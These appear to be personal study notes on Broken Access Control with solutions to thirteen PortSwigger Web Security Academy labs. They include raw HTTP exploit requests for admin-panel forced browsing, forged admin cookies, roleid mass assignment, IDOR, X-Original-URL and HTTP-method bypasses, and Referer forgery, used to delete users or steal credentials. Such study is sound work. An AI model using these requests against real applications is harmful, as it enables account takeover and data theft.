

## 1. Vulnerability Core

- **Vulnerability Type:** Broken Access Control (OWASP Top 10 - #1)
    
- **Core Meaning:** Access control ensures that users can only act within their permitted permissions. When this mechanism breaks, a user can bypass authorization checks to access restricted resources, modify data, or execute unauthorized actions.
    
- **Root Cause:** Authorization checks are missing, misconfigured, or reliant on easily guessable client-side parameters. Because access control design requires manual mapping of business logic, human configuration errors are highly frequent.


## 2. Detection & Attack Surface Mapping

To identify access control vulnerabilities efficiently, map out your attack surface using these primary checks:

- **Forced Browsing:** Actively guess or brute-force hidden paths (e.g., `/admin`, `/api/v1/settings`) that are withheld from the standard UI.
    
- **Information Disclosure files:** Check common configuration leaks such as `/robots.txt`, `sitemap.xml`, or client-side JavaScript bundles (`.js` source maps) for hidden administrative endpoints.
    
- **Parameter Tampering:** Inspect headers and parameters for identifiers that dictate authorization roles (e.g., `isAdmin=false`, `role=user`).


## 3. Classifications (The Scenarios)

### Vertical Privilege Escalation

An attacker gains access to functionality reserved for higher-privileged users (e.g., a standard user accessing an administrator dashboard to delete accounts).

### Horizontal Privilege Escalation (IDOR)

An attacker accesses resources belonging to another user with the _same_ privilege level (e.g., a customer viewing another customer's bank statement by changing an account ID parameter).


## 4. Remediation

- **Deny by Default:** Implement a global security filter that blocks access to all endpoints unless explicitly permitted.
    
- **Server-Side Validation:** Never rely on the client interface to hide links or enforce access logic. Every single incoming request must be authorized on the server side.
    
- **Use Robust Frameworks:** Leverage built-in enterprise authorization mechanisms (e.g., Spring Security, role-based decorators) rather than writing custom parsing logic.



#

### Lab 1: Vertical Privilege Escalation – Unprotected Admin Functionality (Apprentice)

- **Attack Vector:** Information Disclosure via Information Leakage (`robots.txt`) leading to an unprotected administrative endpoint.


### SOLUTION & PAYLOAD BREAKDOWN

- [ ] **Step 1: Reconnaissance (Information Leak Hunting)** Target the site's default index configurations to find hidden attack vectors. Append `/robots.txt` to the root URL:


**GET /robots.txt HTTP/1.1**
**Host: victim-head-id.web-security-academy.net**

**Analysis of Output:** The file reveals a disallowed path intended to hide the administrative interface from search engines:

**User-agent: ***
**Disallow: /administrator-panel**

- [ ] **Step 2: Force Browsing Execution** Directly request the leaked endpoint via your browser or Burp Suite to bypass the UI restriction:

- **Target URL:** `https://victim-head-id.web-security-academy.net/administrator-panel`
    

- [ ] **Step 3: Destructive Action Execution (Payload)** Locate the action trigger button/link for deleting the target user account (`carlos`).

- **Raw Exploitation Payload Request:**
- **Step 3: Destructive Action Execution (Payload)** Locate the action trigger button/link for deleting the target user account (`carlos`).

- **Raw Exploitation Payload Request:**
    

**HTTP**

```
GET /administrator-panel/delete?username=carlos HTTP/1.1
Host: victim-head-id.web-security-academy.net
Connection: close
```

- **Result:** `200 OK` or `302 Redirect`. The backend processes the command directly because it completely lacks an explicit server-side authorization check confirming whether the requesting session belongs to an actual administrator.

## 3. Classifications (The Scenarios) - _Continued_

### Security by Obscurity (Client-Side Leaks)

Developers attempt to hide administrative portals by using long, randomized, or non-predictable URL paths (e.g., `/admin-xyz123`), but leak these exact paths inside client-accessible assets like public JavaScript files.

### Parameter-Based Controls

The application trusts client-side input (cookies, hidden forms, or query variables) to maintain state regarding roles. Attackers can flip values like `false` to `true` or increment user tracking IDs to impersonate administrative users.

### Platform Layer Misconfigurations (Header Injection)

The edge or reverse proxy enforces access control based on the strict URL requested, but passes the traffic back to an internal framework that permits custom, override tracking headers like `X-Original-URL`.


## 

### Lab 2: Vertical Privilege Escalation –  Unprotected Admin Functionality With Unpredictable URL (Apprentice)

- **Attack Vector:** Information disclosure via client-side JavaScript source leak leading to an unauthenticated admin dashboard.


- ### SOLUTION & PAYLOAD BREAKDOWN

- [ ] **Step 1: Reconnaissance (Source Code Inspection)** Analyze the target landing page's DOM or response text. Look for embedded client-side scripts establishing structural logic.

**Leaked Application Source:**

```
var isAdmin = false;
if (isAdmin) {
    var adminPanelTag = document.createElement('a');
    adminPanelTag.setAttribute('href', '/administrator-panel-yb556');
    adminPanelTag.innerText = 'Admin panel';
}
```

- [ ] **Step 2: Accessing the Hidden Target Endpoint** Even though `isAdmin` evaluates to false on your browser execution profile, the target string is static. Manually append the exposed path directly to the host address bar:

- **Target URL:** `https://victim-id.web-security-academy.net/administrator-panel-yb556`
    
- [ ] **Step 3: Destructive Action Execution (Payload)** Fire the user deletion parameters directly down the unauthenticated channel.

- **Raw Exploitation Payload Request:**
    

HTTP

```
GET /administrator-panel-yb556/delete?username=carlos HTTP/1.1
Host: victim-id.web-security-academy.net
Connection: close
```

### Lab 3: User Role Controlled by Request Parameter (Apprentice)

- **Attack Vector:** Client-side cookie tampering enabling immediate privilege escalation.


- ### SOLUTION & PAYLOAD BREAKDOWN

- [ ] **Step 1: Discovering the Tracking Parameter**

1. Log into your low-privilege profile (`wiener:peter`).
    
2. Open Burp Suite -> **HTTP History** -> Analyze the tracking cookies dropped inside the `HTTP/1.1 200 OK` authentication verification handshake.
    

- [ ] **Step 2: Intercepting & Modifying State Profile (Payload)** Catch the tracking stream inside **Burp Proxy** or send it to **Burp Repeater**, modifying the target boolean state key:

- **Raw Insecure Cookie Mod Payload:**
    

HTTP

```
GET /admin HTTP/1.1
Host: victim-id.web-security-academy.net
Cookie: session=XYZ123abc; Admin=true
Connection: close
```

- [ ] **Step 3: Account Deletion Execution** Maintain the forged `Admin=true` attribute value while executing the backend command endpoint.

- **Final Payload:**

```
HTTP
GET /admin/delete?username=carlos HTTP/1.1
Host: victim-id.web-security-academy.net
Cookie: session=XYZ123abc; Admin=true
Connection: close
```


### ### Lab 4: User Role Can Be Modified in User Profile (Apprentice)

- **Attack Vector:** Over-privileged parameter binding (Mass Assignment Flaw) inside an update profile JSON payload structure.
    

  ### **SOLUTION & PAYLOAD BREAKDOWN**

- [ ] **Step 1: Identifying the Target Parameter Response** Log in as `wiener:peter`, submit an update via the email settings panel, and capture the incoming JSON schema response structure.

- **Default Profile Response Metadata:**
    

JSON

```
{
  "username": "wiener",
  "email": "wiener@normal-user.web-security",
  "roleid": 1
}
```

- [ ] **Step 2: Injecting the Privilege Parameter (Payload)** Send the `POST /my-account/change-email` request into **Burp Repeater**. Forcibly append the `roleid` parameter directly into your editable input query JSON block to trick the model binding logic into overwriting your database permissions role profile.

- **Injected HTTP Request Body Payload:**
HTTP

```
POST /my-account/change-email HTTP/1.1
Host: victim-id.web-security-academy.net
Content-Type: application/json
Cookie: session=XYZ123abc

{
  "email": "wiener@normal-user.web-security",
  "roleid": 2
}
```

**Validation:** Look for a `"roleid": 2` response confirmation. Now navigate natively directly to `/admin` and hit delete on user `carlos`.


### **Lab 5: User ID controlled by request parameter**

- **Attack Vector:** Horizontal privilege escalation via direct parameter tampering on account profile routers.
    

  ### **SOLUTION & PAYLOAD BREAKDOWN**

 - [ ] **Step 1: Map the Target Parameter Structure** Log in to your low-privilege profile (`wiener:peter`). Navigate directly to your account section and observe that the session routing relies on a client-controlled URL string parameter:

	- `[https://victim-id.web-security-academy.net/my-account?id=wiener](https://victim-id.web-security-academy.net/my-account?id=wiener)`
    

	-[ ] **Step 2: Intercept and Swap Identifiers (Payload)** Send the request to **Burp Repeater**. Modify the target `id` parameter value to match the victim profile you want to hijack.

- **Raw Forged Profile Request Payload:**
    

	 HTTP
	```
	GET /my-account?id=carlos HTTP/1.1
	Host: victim-id.web-security-academy.net
	Cookie: session=LOW_PRIVILEGE_WIENER_SESSION_TOKEN
	Connection: close
	```
	
	- [ ] **Step 3: Data Exfiltration** Inspect the server output block to extract the leaked API token for `carlos` from the returned HTML body text.




### Lab 6: User ID controlled by request parameter, with unpredictable user IDs(Apprentice)

- **Attack Vector:** Resolving non-predictable GUID parameters using ecosystem-wide information leaks.

   ### SOLUTION & PAYLOAD BREAKDOWN

- [ ] Step 1: Reconnaissance (Leaked GUID Hunting) Navigate public areas of the application (e.g., blog comments, forum posts) where the target user is referenced. Inspect the link targets to harvest their unique ID string.

- **Discovered Carlos GUID:** `d31a574b-1422-44df-9e23-7722904b772d`
    

- [ ] **Step 2: Replay Parameter Attack (Payload)** Swap your own account tracking parameter value with the harvested GUID inside Burp Suite.

- **Raw Execution Request:**

`GET /my-account?id=d31a574b-1422-44df-9e23-7722904b772d HTTP/1.1 Host: victim-id.web-security-academy.net Cookie: session=wiener_session_cookie`


### Lab 7: User ID Controlled Parameter with Data Leakage in Redirect (Apprentice)

- **Attack Vector:** Exploiting "Insecure Execution Order" where the back-end populates the response body template before evaluating the redirect state command.

	### **###SOLUTION & PAYLOAD BREAKDOWN**

- [ ] **Step 1: Identify Bypassed Security Flow** Change the URL path profile parameters from `id=wiener` to `id=carlos`. The browser immediately returns a standard `HTTP/1.1 302 Found` redirect forcing you back to `/login`.

- [ ] **Step 2: Read Response Body Directly (Payload)** Intercept the response traffic inside **Burp Suite Repeater**. Do not follow the redirect. Examine the raw data block trailing below the header fields.

- **Leaked Response Data Structure:**
  
  HTTP

```
HTTP/1.1 302 Found
Location: /login
Content-Length: 421

<div>
    <h1>User Profile: carlos</h1>
    <p>Your API Key is: leaked_api_key_here</p>
</div>
```

**Step 2: HTML Source Extraction (Payload)** Inspect the reflected HTML form components inside the return body. Locate the hidden or masked credential container tag field:

`<input type="password" name="password" value="admin_cleartext_password_leaked" />`

**Step 3: Administrative Conquest** Log out of `wiener`, authenticate as `administrator` using the harvested credentials, and navigate cleanly to `/admin` to destroy `carlos`.


### Lab 8: User ID controlled by request parameter with password disclosure

- **Attack Vector:** Escalating a horizontal parameter-based information leak into full vertical administrative takeover due to cleartext data reflection.
    

 ## **SOLUTION & PAYLOAD BREAKDOWN** 


**Step 1: Direct Object Manipulation on Administrative Profile** Target the resource page using the high-privilege identifier `administrator` instead of your own identifier.

 **Raw Target Profile Request:**

HTTP

````
 GET /my-account?id=administrator HTTP/1.1
 Host: victim-id.web-security-academy.net
 Cookie: session=LOW_PRIVILEGE_WIENER_SESSION_TOKEN
 Connection: close
 ```
  ****Step 2: Credential Extraction (Payload)****
 View the raw HTML response body in Burp Suite. Locate the masked password input field element where the application backend has improperly pre-filled the password in cleartext:
 
```html
 <input type="password" name="password" value="admin_cleartext_password_leaked" />
 ```
 
 **Step 3: Full Vertical Takeover**
Log out of the `wiener` account, log back in as `administrator` using the harvested credentials, and navigate natively to the admin panel interface to delete `carlos`.

---
````

### Classification-4: Insecure Direct Object References (IDOR)

A subcategory of access control where an application uses client-controlled input to fetch data files or objects directly from the database or host file system without server-side ownership validation.

### Lab 9: Insecure Direct Object References – IDOR (Apprentice)

- **Attack Vector:** Static file-system numeric incrementation manipulation.

### SOLUTION & PAYLOAD BREAKDOWN

- [ ] **Step 1: Mapping the File Storage Structure** Initialize a session with the site's "Live Chat" module. Click **View transcript**. Analyze the resulting file path scheme: `/download-transcript/2.txt`.

- [ ] **Step 2: File Iteration Traversals (Payload)** Modify the numeric filename path tracking down to discover earlier chat logs stored globally inside the same shared storage bucket folder.

- **Raw Target File Request:**

 `GET /download-transcript/1.txt HTTP/1.1
  Host: victim-id.web-security-academy.net`


**Payload Output:** Read the clear text chat log file to extract `carlos`'s password.     


### Classification-5: URL-Matching Discrepancies

Different routing engines interpret paths differently. If a front-end filter uses strict regex matching but the back-end framework treats variation paths identically, a bypass occurs.

- **Case Sensitivity:** `/ADMIN/DELETEUSER` maps to `/admin/deleteUser`.
    
- **Suffix Extensions:** `/admin/deleteUser.anything` processed via legacy Spring framework (`useSuffixPatternMatch`).
    
- **Trailing Slashes:** `/admin/deleteUser/` treated as a unique string by proxies but resolved normally by back-ends.


### Lab 10. URL-Based Access Control Can Be Circumvented (Practitioner)

- **Attack Vector:** Front-end proxy bypass using the `X-Original-URL` framework routing override header wrapper.
    
###  SOLUTION & PAYLOAD BREAKDOWN


- [ ] **Step 1: Analyzing the Filtering Frontier** Attempting to request `GET /admin` directly drops a plain error structure from an intermediate front-end application reverse-proxy gateway blocking structural external reads.

- [ ] **Step 2: Confirming Back-end Framework Parsing Behavior** Send your target tracking line into **Burp Repeater**. Point the root destination directory address line directly at a safe endpoint `/`, but pass the custom pointer header value down to check if the underlying internal platform stack parses it implicitly.

	HTTP
	
	```
	GET / HTTP/1.1
	Host: victim-id.web-security-academy.net
	X-Original-URL: /invalid-route-test
	```
	
	- **Validation Response:** Returns `404 Not Found` rather than a standard `200 OK` for the home index page. This confirms the back-end system explicitly decodes and follows the path inside the header.

 - [ ] **Step 3: Admin Escalation & Deletion Execution (Payload)** Request the root engine block directory, feed the execution query parameters directly through the exposed internal router tracking line, and fire.


  - **Raw Multi-Stage Bypassing Payload:**

   HTTP
	```
	GET /?username=carlos HTTP/1.1
	Host: victim-id.web-security-academy.net
	X-Original-URL: /admin/delete
	Connection: close
	```


### Classification 6: Method-Based Access Control Bypasses

The front-end proxy limits restrictions only to standard administrative request methods (like `POST`). However, if the back-end application framework tolerates alternative or non-standard HTTP methods (e.g., changing `POST` to `GET` or `POSTX`), the restriction can be bypassed entirely.

### Lab 11: Method-Based Access Control Can Be Circumvented (Practitioner)

- **Attack Vector:** Bypassing restrictive WAF/Proxy policy rule matrices by altering the requested HTTP verb.
    

### **### SOLUTION & PAYLOAD BREAKDOWN**


- [ ] **Step 1: Capture the Privileged Function** Log in as `administrator:admin`, execute the role promotion on user `carlos`, and send the resulting traffic stream into **Burp Repeater**.

- [ ] **Step 2: Test Session Session Swapping** Copy the session token of your low-privilege user (`wiener`) into the captured `POST` structure. Send it. The application drops an explicit **Unauthorized** message.

- [ ] **Step 3: Modify Request Verb (Payload)** Right-click inside Burp Repeater -> **Change request method** to convert the request configuration from `POST` to `GET`. Swap the username to yours (`wiener`).

**Raw Bypassing HTTP Payload:**

HTTP

```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: victim-id.web-security-academy.net
Cookie: session=LOW_PRIVILEGE_WIENER_SESSION_TOKEN
Connection: close
```


### Lab 12. Access Control in Multi-Step Processes # with no access control on one step (Practitioner)

- **Attack Vector:** Insecure implicit step execution validation on secondary administrative confirm parameters.


### SOLUTION & PAYLOAD BREAKDOWN

- [ ] **Step 1: Map the Multi-Step Admin Framework Sequence** Log in with administrative credentials (`administrator:admin`). Promote `carlos`. Capture the final execution verification confirmation action packet via Burp Repeater.

- [ ] **Step 2: Extract the Final Request Structure** Note that step 2 uses an explicit action parameter string:

- [ ] `POST /admin-roles HTTP/1.1
- [ ] ...
- [ ] action=upgrade&username=carlos`


- [ ] **Step 3: Privilege Replay Session Hijack (Payload)** Open a separate incognito window. Log in as your low-privilege `wiener` account. Copy your `wiener` session token value. Inject it directly into the captured step 2 repeater payload profile, changing the target value to your own username.

- **Raw High-Privilege Promotion Replay Payload:**

HTTP

```
POST /admin-roles HTTP/1.1
Host: victim-id.web-security-academy.net
Cookie: session=WIENER_LOW_PRIV_SESSION_TOKEN
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

action=upgrade&username=wiener
```


### Lab 13. Referer-Based Access Control (Practitioner)

- **Attack Vector:** Flawed header trust verification where access maps solely to the upstream client `Referer` history declaration.


### SOLUTION & PAYLOAD BREAKDOWN

- [ ] **Step 1: Capture the Admin Action Framework Path** Log in as `administrator:admin`. Access the administration dashboard settings component panel and select the user role elevation function. Send the captured HTTP request directly to **Burp Repeater**.

- [ ] **Step 2: Forging Upstream Component Values (Payload)** Copy the session cookie of your low-privilege user account (`wiener`). Paste it into the Repeater template. Ensure the `Referer` line is explicitly pointing to the primary administrative hub to pass the structural validation gate check.

- **Raw Forged Header Payload:**
HTTP

```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: victim-id.web-security-academy.net
Cookie: session=WIENER_LOW_PRIV_SESSION_TOKEN
Referer: https://victim-id.web-security-academy.net/admin
Connection: close
```
